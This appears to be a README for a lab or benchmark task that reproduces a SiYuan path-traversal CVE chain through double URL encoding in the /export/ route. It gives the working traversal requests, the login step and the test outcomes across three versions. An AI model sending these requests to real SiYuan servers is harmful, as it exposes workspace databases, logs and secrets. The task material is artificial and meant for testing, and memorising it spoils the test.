# siyuan-cve-2026-41894

CVE-2026-30869 -> CVE-2026-41894 (incomplete-fix chain, path traversal via double URL encoding in /export/).

- V0 = SiYuan 3.5.9  (serveExport has no IsSensitivePath check)
- V1 = SiYuan 3.5.10 (CVE-2026-30869 fix: IsSensitivePath denylist for conf/ and OS paths; temp/ unblocked) <- target
- V2 = SiYuan 3.6.5  (CVE-2026-41894 fix: `gulu.File.IsSubPath(exportBaseDir, fullPath)` + `*.db/*.log` denylist)

## Mechanism

Go's HTTP server decodes percent-encoding once during request parsing. The
`serveExport()` handler performs a redundant second `url.PathUnescape()`:

- request:  `GET /export/%252e%252e/pcb_flag.txt`
- Go decodes `%25` -> `%`:  `URL.Path = /export/%2e%2e/pcb_flag.txt` (gin wildcard matches)
- `PathUnescape` -> `../pcb_flag.txt`
- `filepath.Join(exportBaseDir, "../pcb_flag.txt")` = `<workspace>/temp/pcb_flag.txt`

The CVE-2026-30869 fix (3.5.10) blocks `<workspace>/conf/` and OS-level paths via
`IsSensitivePath`, but `workspace/temp/siyuan.db`, `blocktree.db`, `siyuan.log`
and all temp files remain readable.

## Seed (CVE-2026-30869)

`GET /export/%252e%252e/%252e%252e/conf/pcb_secret.txt` reads the flag file inside
the workspace conf directory: open on 3.5.9 (no check), 403 on 3.5.10
(IsSensitivePath conf prefix).

## Residual (CVE-2026-41894)

`GET /export/%252e%252e/pcb_flag.txt` reads the flag file next to the export dir
(workspace/temp/): open on 3.5.10 (denylist does not cover temp), 401 on 3.6.5
(IsSubPath rejects any path outside the export dir).

## Auth

`POST /api/system/loginAuth {"authCode":"pcb"}` -> session cookie, then the
traversal GET with that cookie.

## Flag

The compose entrypoint plants `$PCB_FLAG` into `workspace/conf/pcb_secret.txt`
and `workspace/temp/pcb_flag.txt` before starting the kernel.

## Gate

Four edges verified in real Docker: seed@V0 reaches (200, flag), seed@V1 blocked
(403), residual@V1 reaches (200, flag), residual@V2 blocked (401). See repro.log.
